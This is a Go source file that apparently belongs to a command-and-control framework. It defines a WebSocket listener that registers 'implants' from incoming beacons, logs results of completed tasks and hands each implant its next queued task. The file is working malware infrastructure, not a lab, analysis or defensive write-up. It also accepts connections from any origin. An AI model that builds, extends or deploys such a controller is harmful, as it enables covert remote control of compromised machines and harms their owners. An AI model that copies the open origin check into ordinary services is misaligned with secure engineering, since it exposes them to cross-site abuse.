package listeners
import(
	"fmt"
	"net/http"
	"context"
	"time"
	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool{
		return true
	},
}

func (m *Manager) StartWebSocket(){
	m.mu.Lock()
	if m.activeWS != nil{
		m.mu.Unlock()
		return
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/ws", m.handleWebSocket)
	server := &http.Server{
		Addr: ":8443",
		Handler: mux,
	}
	m.activeWS = server
	m.mu.Unlock()
	go func(){
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed{
			fmt.Printf("WebSocket listner error: %v\n",err)
		}
	}()
}

func (m *Manager) StopWebSocket() {
	m.mu.Lock()
	defer m.mu.Unlock()
	if m.activeWS == nil{
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(),5*time.Second)
	defer cancel()
	_ = m.activeWS.Shutdown(ctx)
	m.activeWS = nil
}

func (m *Manager) handleWebSocket(w http.ResponseWriter, r *http.Request){
	conn, err := upgrader.Upgrade(w,r,nil)
	if err != nil{
		fmt.Printf("WebSocket upgrade error: %v\n", err)
		return
	}
	defer conn.Close()
	_,msg,err := conn.ReadMessage()
	if err != nil{
		fmt.Printf("WebSocket read error: %v\n",err)
		return
	}
	b, err := m.Receiver.Process(msg)
	if err != nil{
		fmt.Printf("beacon rejected: %v\n", err)
		return
	}
	fmt.Printf("WebSocket beacon type: %d\n", b.Type)
	implantID := fmt.Sprintf("%x", b.ImplantID)
	if b.Type == 0{
		m.Queue.RegisterImplant(implantID, string(b.Data))
	}
	if b.Type == 1{
		m.Queue.CompleteTask(implantID, string(b.Data))
	}
	m.Queue.UpdateLastSeen(implantID)
	task,err := m.Queue.GetNextTask(implantID)
	if err != nil{
		task = "noop"
	}
	err = conn.WriteMessage(websocket.BinaryMessage, []byte(task))
	if err != nil{
		fmt.Printf("WebSocket write error: %v\n", err)
	}
}